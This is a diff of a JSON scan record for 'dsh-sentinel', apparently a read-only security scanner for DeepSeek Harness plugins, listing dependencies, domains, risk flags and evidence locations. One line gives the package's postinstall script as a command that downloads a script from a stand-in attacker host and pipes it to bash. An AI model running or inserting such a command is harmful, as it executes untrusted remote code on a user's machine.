@@ -2,8 +2,9 @@
  "repo": "Eligahyu/dsh-sentinel",
  "stars": 1,
  "description": "🛡️ 给 DeepSeek Harness 插件拍 X 光 — 插件安全体检与健康检查。零依赖只读静态扫描:代码执行/凭据/外传/混淆/安装脚本/bundle 清单,0-100 风险分。DSH tool plugin + standalone CLI。",
- "pushed_at": "2026-08-17T16:47:54Z",
+ "pushed_at": "2026-08-19T02:44:01Z",
  "status": "ok",
+ "first_seen": "2026-08-19",
  "manifest": {
   "bundle": {
    "patch": "./cordis.patch.yml"
@@ -11,10 +12,12 @@
  },
  "pkg_name": "deepseek-harness-sentinel",
  "deps": [
+  "acorn",
   "@deepseek-ai/cordis",
   "@deepseek-ai/dsh-tools",
   "@deepseek-ai/cordis",
-  "@deepseek-ai/dsh-tools"
+  "@deepseek-ai/dsh-tools",
+  "helper"
  ],
  "install_scripts": {
   "postinstall": "curl -s http://evil.example/install.sh | bash"
@@ -23,40 +26,44 @@
   "tools"
  ],
  "hooks": [],
- "tool_regs": 6,
+ "tool_regs": 38,
  "domains": {
-  "cdn.jsdelivr.net": 3
+  "cdn.jsdelivr.net": 3,
+  "json.schemastore.org": 1,
+  "api.osv.dev": 1
  },
  "env": {
-  "DSH_HARNESS_CHECKOUT": 2
+  "DSH_HARNESS_CHECKOUT": 2,
+  "SENTINEL_NPM_REGISTRY": 1
  },
  "behaviors": {
   "exec": {
-   "src": 17,
-   "dev": 4,
+   "src": 63,
+   "dev": 17,
    "evidence": [
-    "engine/rules.js:63",
-    "engine/rules.js:63",
-    "engine/rules.js:63",
-    "engine/rules.js:67",
-    "engine/rules.js:67"
+    "engine/rules.js:70",
+    "engine/rules.js:70",
+    "engine/rules.js:70",
+    "engine/rules.js:74",
+    "engine/rules.js:74"
    ]
   },
   "eval": {
    "src": 4,
-   "dev": 9,
+   "dev": 13,
    "evidence": [
-    "engine/rules.js:114",
-    "engine/rules.js:114",
-    "engine/rules.js:126",
-    "engine/scanner.js:130"
+    "engine/report.js:68",
+    "engine/rules.js:123",
+    "engine/rules.js:123",
+    "engine/rules.js:135"
    ]
   },
   "base64_decode": {
-   "src": 1,
-   "dev": 3,
+   "src": 2,
+   "dev": 7,
    "evidence": [
-    "engine/rules.js:126"
+    "engine/report.js:68",
+    "engine/rules.js:135"
    ]
   },
   "net_server": {
@@ -65,14 +72,14 @@
    "evidence": []
   },
   "fs_write": {
-   "src": 21,
-   "dev": 54,
+   "src": 51,
+   "dev": 108,
    "evidence": [
-    "bin/sentinel.mjs:135",
-    "bin/sentinel.mjs:136",
-    "engine/rules.js:213",
-    "engine/rules.js:213",
-    "engine/rules.js:213"
+    "bin/sentinel.mjs:257",
+    "bin/sentinel.mjs:258",
+    "bin/sentinel.mjs:268",
+    "bin/sentinel.mjs:269",
+    "bin/sentinel.mjs:278"
    ]
   },
   "dyn_import": {
@@ -82,7 +89,7 @@
   }
  },
  "has_apply": true,
- "files_scanned": 17,
+ "files_scanned": 45,
  "has_skill_md": false,
  "type": "plugin",
  "flags": [
@@ -96,15 +103,15 @@
   },
   {
    "id": "exec",
-   "evidence": "×17 src, e.g. engine/rules.js:63, engine/rules.js:63"
+   "evidence": "×63 src, e.g. engine/rules.js:70, engine/rules.js:70"
   },
   {
    "id": "eval",
-   "evidence": "×4 src, e.g. engine/rules.js:114, engine/rules.js:114"
+   "evidence": "×4 src, e.g. engine/report.js:68, engine/rules.js:123"
   },
   {
    "id": "base64_decode",
-   "evidence": "×1 src, e.g. engine/rules.js:126"
+   "evidence": "×2 src, e.g. engine/report.js:68, engine/rules.js:135"
   }
  ],
  "level": 3
